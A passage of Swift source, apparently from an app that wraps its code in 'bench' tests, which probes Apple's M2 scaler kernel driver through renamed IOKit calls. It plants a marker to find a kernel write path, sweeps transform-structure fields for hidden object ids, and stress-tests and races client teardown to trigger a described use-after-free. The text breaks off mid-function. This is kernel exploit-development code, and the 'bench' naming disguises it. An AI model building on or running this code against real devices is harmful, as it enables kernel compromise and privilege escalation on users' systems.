                    kr = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                                sop.baseAddress, &scount, ob.baseAddress, &size)
                }
            }
            return kr == 0 ? Array(out.prefix(size)) : []
        }

        // Property with a marker.
        var prop = [UInt8](repeating: 0, count: 0x18)
        let marker: UInt64 = 0xDEAD_CAFE_BEEF_1337
        withUnsafeBytes(of: marker.littleEndian) { raw in
            for (i, b) in raw.enumerated() { prop[8 + i] = b }
        }
        var pk: kern_return_t = -1
        var dsz = 0
        prop.withUnsafeBytes { ib in
            pk = xq_IOConnectCallMethod(conn, 10, nil, 0, ib.baseAddress, 0x18, nil, nil, nil, &dsz)
        }

        // Transform with the surface pair, three scalars.
        var tin = [UInt8](repeating: 0, count: 0x1b0)
        withUnsafeBytes(of: srcID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { tin[i] = b }
        }
        withUnsafeBytes(of: dstID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { tin[4 + i] = b }
        }
        var tsc: [UInt64] = [UInt64(srcID), UInt64(dstID), 0]
        var tk: kern_return_t = -1
        tin.withUnsafeBytes { ib in
            tk = xq_IOConnectCallMethod(conn, 1, &tsc, 3, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
        }

        let data = readBack()
        var markerAt: [Int] = []
        var p = 0
        while p + 8 <= data.count {
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(data[p + i]) << (8 * i) }
            if v == marker { markerAt.append(p) }
            p += 8
        }
        benchLine("     property=\(name(pk)) transform=\(name(tk)) readBack=\(data.count)B")
        benchLine(markerAt.isEmpty
                  ? "[NO] marker not in the buffer after ring setup"
                  : "[OK] marker at \(markerAt.map { "0x" + String($0, radix: 16) }.joined(separator: ","))")
        benchLine("??? done")
    }

    // MARK: - test 34: transform variants after warm-up

    /// The transform branches on *(input+8), and the destination surface may sit
    /// at offset 4 or 8. This tries both placements and several branch values,
    /// looking for the combination that makes the marker reach the read-back.
    func bench34ScalerTransformVariants() {
        benchLine("??? 34 ?? scaler transform variants")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)
        benchLine("     surfaces src=\(srcID) dst=\(dstID)")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func readBack() -> [UInt8] {
            var out = [UInt8](repeating: 0, count: 0x400)
            var size = 0x400
            var scount: UInt32 = 16
            var sOut = [UInt64](repeating: 0, count: 16)
            var kr: kern_return_t = -1
            out.withUnsafeMutableBytes { ob in
                sOut.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                                sop.baseAddress, &scount, ob.baseAddress, &size)
                }
            }
            return kr == 0 ? Array(out.prefix(size)) : []
        }

        let marker: UInt64 = 0xDEAD_CAFE_BEEF_1337
        func setProperty() -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x18)
            withUnsafeBytes(of: marker.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[8 + i] = b }
            }
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 10, nil, 0, ib.baseAddress, 0x18, nil, nil, nil, &dsz)
            }
            return kr
        }

        func transform(dstOffset: Int, flag: UInt32, scalars: Bool) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            withUnsafeBytes(of: srcID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: dstID.littleEndian) { raw in
                for (i, b) in raw.enumerated() where dstOffset + i < input.count { input[dstOffset + i] = b }
            }
            withUnsafeBytes(of: flag.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[8 + i] = b }
            }
            var dsz = 0
            var kr: kern_return_t = -1
            if scalars {
                var sc: [UInt64] = [UInt64(srcID), UInt64(dstID), 0]
                input.withUnsafeBytes { ib in
                    kr = xq_IOConnectCallMethod(conn, 1, &sc, 3, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
                }
            } else {
                input.withUnsafeBytes { ib in
                    kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
                }
            }
            return kr
        }

        let baseline = readBack()
        benchLine("     baseline \(baseline.count) bytes")

        let variants: [(String, Int, UInt32, Bool)] = [
            ("dst@4 flag0 struct", 4, 0, false),
            ("dst@4 flag1 struct", 4, 1, false),
            ("dst@4 flag2 struct", 4, 2, false),
            ("dst@8 flag0 struct", 8, 0, false),
            ("dst@8 flag1 struct", 8, 1, false),
            ("dst@4 flag0 +scalars", 4, 0, true),
            ("dst@8 flag1 +scalars", 8, 1, true),
        ]

        for (label, off, flag, sc) in variants {
            let pk = setProperty()
            let tk = transform(dstOffset: off, flag: flag, scalars: sc)
            let after = readBack()
            guard !after.isEmpty else { continue }
            var found = false
            var p = 0
            while p + 8 <= after.count {
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(after[p + i]) << (8 * i) }
                if v == marker { found = true; break }
                p += 8
            }
            var changed = 0
            for i in 0..<min(baseline.count, after.count) where baseline[i] != after[i] { changed += 1 }
            benchLine("     \(label): set=\(pk) tf=\(tk) ?? marker=\(found) ?? \(changed) byte(s) differ")
        }

        benchLine("??? done")
    }

    // MARK: - test 35: fill the ring

    /// The ring holds 16 entries. Every test so far submitted a single transform,
    /// so the ring was never exercised. This runs many transforms with the marker
    /// property set first, then reads the buffer back.
    func bench35ScalerRingFill() {
        benchLine("??? 35 ?? scaler ring fill")
        benchLine("     16-entry ring ?? submitting a burst of transforms")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func readBack() -> [UInt8] {
            var out = [UInt8](repeating: 0, count: 0x400)
            var size = 0x400
            var scount: UInt32 = 16
            var sOut = [UInt64](repeating: 0, count: 16)
            var kr: kern_return_t = -1
            out.withUnsafeMutableBytes { ob in
                sOut.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallMethod(conn, 11, nil, 0, nil, 0,
                                                sop.baseAddress, &scount, ob.baseAddress, &size)
                }
            }
            return kr == 0 ? Array(out.prefix(size)) : []
        }

        let marker: UInt64 = 0xDEAD_CAFE_BEEF_1337
        func setProperty() -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x18)
            withUnsafeBytes(of: marker.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[8 + i] = b }
            }
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 10, nil, 0, ib.baseAddress, 0x18, nil, nil, nil, &dsz)
            }
            return kr
        }

        var input = [UInt8](repeating: 0, count: 0x1b0)
        withUnsafeBytes(of: srcID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { input[i] = b }
        }
        withUnsafeBytes(of: dstID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { input[4 + i] = b }
        }
        func transform() -> kern_return_t {
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
            }
            return kr
        }

        let baseline = readBack()
        benchLine("     baseline \(baseline.count) bytes ?? property \(setProperty() == 0 ? "ok" : "failed")")

        var ok = 0, firstChange = -1, changedTotal = 0, markerSeen = false
        for round in 1...24 {
            if transform() == 0 { ok += 1 }
            let after = readBack()
            guard !after.isEmpty else { continue }
            var changed = 0
            for i in 0..<min(baseline.count, after.count) where baseline[i] != after[i] {
                changed += 1
                if firstChange < 0 { firstChange = i }
            }
            if changed > 0 && changedTotal == 0 {
                benchLine("     round \(round): first difference at +0x\(String(firstChange, radix: 16)) (\(changed) bytes)")
            }
            changedTotal = max(changedTotal, changed)
            var p = 0
            while p + 8 <= after.count {
                var v: UInt64 = 0
                for i in 0..<8 { v |= UInt64(after[p + i]) << (8 * i) }
                if v == marker { markerSeen = true; break }
                p += 8
            }
        }

        benchLine("     transforms ok: \(ok)/24 ?? max diff \(changedTotal) byte(s) ?? marker \(markerSeen)")
        if changedTotal == 0 {
            benchLine("[NO] the buffer never changed across 24 transforms ??? the ring does not feed it")
        } else if markerSeen {
            benchLine("[OK] marker reached the buffer ??? the write path is live")
        } else {
            benchLine("[?] buffer changed but the marker is elsewhere ??? offset needs calibrating")
        }
        benchLine("??? done")
    }

    // MARK: - test 36: re-probe the selectors with a live context

    /// Every earlier selector probe ran without a scaler context, because the
    /// context only appears after VTPixelTransfer warm-up. This repeats the
    /// documented ABI with the context alive and reports what changed.
    func bench36ScalerLiveABI() {
        benchLine("??? 36 ?? scaler ABI with a live context")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ sel: UInt32, _ scalars: [UInt64], _ size: Int) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(size, 1))
            var sc = scalars.isEmpty ? [UInt64](repeating: 0, count: 1) : scalars
            var dsz = 0
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                sc.withUnsafeMutableBufferPointer { sb in
                    kr = xq_IOConnectCallMethod(conn, sel,
                                                scalars.isEmpty ? nil : sb.baseAddress, UInt32(scalars.count),
                                                size == 0 ? nil : ib.baseAddress, size,
                                                nil, nil, nil, &dsz)
                }
            }
            return kr
        }

        // Documented entries, shifted by one, now with the context alive.
        let table: [(String, UInt32, [Int])] = [
            ("transform", 1, [0x1b0]),
            ("ring setup", 4, [0x20, 0x18, 0x28]),
            ("LUT upload", 6, [0xfa8]),
            ("param A", 7, [0x8]),
            ("param B", 8, [0x8]),
            ("param C", 9, [0x10]),
            ("set property", 10, [0x18]),
        ]
        for (label, sel, sizes) in table {
            var parts: [String] = []
            for size in sizes {
                var scParts: [String] = []
                for sc in 0...3 {
                    let kr = call(sel, [UInt64](repeating: 0, count: sc), size)
                    scParts.append("sc\(sc)=\(name(kr))")
                }
                parts.append("0x\(String(size, radix: 16)): " + scParts.joined(separator: " "))
            }
            benchLine("     \(label) sel \(sel)")
            for p in parts { benchLine("          \(p)") }
        }

        benchLine("     any ok here that was BadArgument before means the context unlocks it")
        benchLine("??? done")
    }

    // MARK: - test 37: transform field sweep with kernel-log oracle

    /// The read-back buffer never changes, so it cannot tell us what the driver
    /// does. The kernel log can: the kext prints "Scaler[...] Request ..." lines.
    /// This sweeps every 8-byte field of the transform structure and ends with a
    /// burst, so the log shows which shapes reach the request path.
    func bench37ScalerLogOracle() {
        benchLine("??? 37 ?? scaler field sweep")
        benchLine("     watch the kernel log for Scaler[...] lines during this test")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func base() -> [UInt8] {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            withUnsafeBytes(of: srcID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: dstID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[4 + i] = b }
            }
            return input
        }

        func submit(_ input: [UInt8], scalars: [UInt64] = []) -> kern_return_t {
            var dsz = 0
            var buf = input
            var sc = scalars.isEmpty ? [UInt64](repeating: 0, count: 1) : scalars
            var kr: kern_return_t = -1
            buf.withUnsafeBytes { ib in
                sc.withUnsafeMutableBufferPointer { sb in
                    kr = xq_IOConnectCallMethod(conn, 1,
                                                scalars.isEmpty ? nil : sb.baseAddress, UInt32(scalars.count),
                                                ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
                }
            }
            return kr
        }

        let clean = submit(base(), scalars: [UInt64(srcID), UInt64(dstID), 0])
        benchLine("     baseline transform: \(name(clean))")

        // One field at a time, set to 1, skipping the two surface ids.
        var okCount = 0
        var off = 8
        while off < 0x1b0 {
            var input = base()
            input[off] = 1
            let kr = submit(input)
            if kr == 0 { okCount += 1 }
            if kr != clean {
                benchLine("     offset 0x\(String(off, radix: 16))=1 ?? \(name(kr))")
            }
            off += 8
        }
        benchLine("     field sweep: \(okCount) accepted of \(0x1b0 / 8 - 1)")

        // Burst: enough operations to push through the 16-entry ring.
        var burstOK = 0
        for i in 0..<40 {
            var input = base()
            // vary the timestamp-ish field so entries are not identical
            withUnsafeBytes(of: UInt64(i).littleEndian) { raw in
                for (k, b) in raw.enumerated() { input[0x10 + k] = b }
            }
            if submit(input) == 0 { burstOK += 1 }
        }
        benchLine("     burst: \(burstOK)/40 accepted")

        benchLine("     compare with the kernel log for Scaler request lines")
        benchLine("??? done")
    }

    // MARK: - test 38: the four validated fields of the transform structure

    /// Offsets 0x110, 0x138, 0x160 and 0x188 reject the value 1 with BadArgument
    /// while the other fields accept it. That is the shape of an object id. This
    /// puts real surface ids there instead and reports the answer.
    func bench38ScalerExtraSurfaces() {
        benchLine("??? 38 ?? scaler extra surface fields")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary),
              let thirdS = IOSurfaceCreate(bgra as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = srcS; _ = dstS; _ = thirdS }
        let srcID = IOSurfaceGetID(srcS)
        let dstID = IOSurfaceGetID(dstS)
        let thirdID = IOSurfaceGetID(thirdS)
        benchLine("     surfaces src=\(srcID) dst=\(dstID) extra=\(thirdID)")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        let offsets = [0x110, 0x138, 0x160, 0x188]
        func makeInput() -> [UInt8] {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            withUnsafeBytes(of: srcID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: dstID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[4 + i] = b }
            }
            return input
        }

        func put(_ id: UInt32, _ at: Int, _ input: inout [UInt8]) {
            withUnsafeBytes(of: id.littleEndian) { raw in
                for (i, b) in raw.enumerated() where at + i < input.count { input[at + i] = b }
            }
        }

        func submit(_ input: [UInt8]) -> kern_return_t {
            var dsz = 0
            var buf = input
            var kr: kern_return_t = -1
            buf.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
            }
            return kr
        }

        var input = makeInput()
        benchLine("     baseline: \(name(submit(input)))")

        for off in offsets {
            for (label, id) in [("src", srcID), ("dst", dstID), ("extra", thirdID)] {
                var probe = input
                put(id, off, &probe)
                let kr = submit(probe)
                if kr != -536870206 {
                    benchLine("     0x\(String(off, radix: 16))=\(label) ?? \(name(kr))")
                }
            }
            // both halves as a 64-bit value
            var probe = input
            withUnsafeBytes(of: (UInt64(srcID) | (UInt64(dstID) << 32)).littleEndian) { raw in
                for (i, b) in raw.enumerated() where off + i < probe.count { probe[off + i] = b }
            }
            let kr = submit(probe)
            if kr != -536870206 {
                benchLine("     0x\(String(off, radix: 16))=u64(src|dst) ?? \(name(kr))")
            }
        }

        // All four at once, with the source, destination and the spare surface.
        var all = input
        put(srcID, 0x110, &all)
        put(dstID, 0x138, &all)
        put(thirdID, 0x160, &all)
        put(thirdID, 0x188, &all)
        benchLine("     all four set: \(name(submit(all)))")

        // And a burst through the all-four shape.
        var ok = 0
        for _ in 0..<20 { if submit(all) == 0 { ok += 1 } }
        benchLine("     burst with all four: \(ok)/20")

        benchLine("     a field that turns BadArgument into ok is an object id")
        benchLine("??? done")
    }

    // MARK: - test 39: client teardown stress

    /// The public scaler bug lives in the client teardown path: an entry survives
    /// the close of one client and is consumed through a later one. Every test so
    /// far kept a single connection open. This opens, works and closes in a loop.
    func bench39ScalerTeardown() {
        benchLine("??? 39 ?? scaler teardown stress")
        benchLine("     open ??? transform ??? close, repeated ?? looking for a hang or a panic")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        func service() -> io_service_t {
            guard let mm = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return 0 }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, mm, &it) == KERN_SUCCESS else { return 0 }
            let s = xq_IOIteratorNext(it)
            xq_IOObjectRelease(it)
            return s
        }

        func round(_ label: String, using transformation: Bool) -> (Int, Int) {
            var opened = 0, transformed = 0
            for i in 0..<12 {
                let svc = service()
                guard svc != 0 else { continue }
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, 0, &conn)
                xq_IOObjectRelease(svc)
                guard kr == 0 else { continue }
                opened += 1
                if transformation {
                    let bgra: [IOSurfacePropertyKey: Any] = [
                        .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
                        .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
                    ]
                    let yuv: [IOSurfacePropertyKey: Any] = [
                        .width: 64, .height: 64,
                        .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
                    ]
                    if let a = IOSurfaceCreate(bgra as CFDictionary),
                       let b = IOSurfaceCreate(yuv as CFDictionary) {
                        var input = [UInt8](repeating: 0, count: 0x1b0)
                        let sid = IOSurfaceGetID(a), did = IOSurfaceGetID(b)
                        withUnsafeBytes(of: sid.littleEndian) { raw in
                            for (k, v) in raw.enumerated() { input[k] = v }
                        }
                        withUnsafeBytes(of: did.littleEndian) { raw in
                            for (k, v) in raw.enumerated() { input[4 + k] = v }
                        }
                        var dsz = 0
                        input.withUnsafeBytes { ib in
                            if xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0,
                                                      nil, nil, nil, &dsz) == 0 {
                                transformed += 1
                            }
                        }
                        _ = a; _ = b
                    }
                }
                xq_IOServiceClose(conn)
                _ = i
            }
            return (opened, transformed)
        }

        // Plain open/close cycles first: cheapest way to exercise teardown.
        let (o1, _) = round("open/close", using: false)
        benchLine("     open/close cycles: \(o1)/12 opened")

        // Then with a transform on every connection, the shape the bug needs.
        let (o2, t2) = round("transform", using: true)
        benchLine("     open???transform???close: \(o2)/12 opened, \(t2) transformed")

        // A second pass back to back, in case the stale entry needs a reuse.
        let (o3, t3) = round("transform again", using: true)
        benchLine("     second pass: \(o3)/12 opened, \(t3) transformed")

        benchLine("     no hang means teardown alone does not reproduce it")
        benchLine("??? done")
    }

    // MARK: - test 40: concurrent transforms against teardown

    /// The teardown sequence alone is clean. A UAF of this shape needs overlap:
    /// one thread inside the transform while another closes clients. This runs
    /// both at once and reports whether the device survives.
    func bench40ScalerRace() {
        benchLine("??? 40 ?? scaler concurrency race")
        benchLine("     transforms on several connections while clients open and close")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
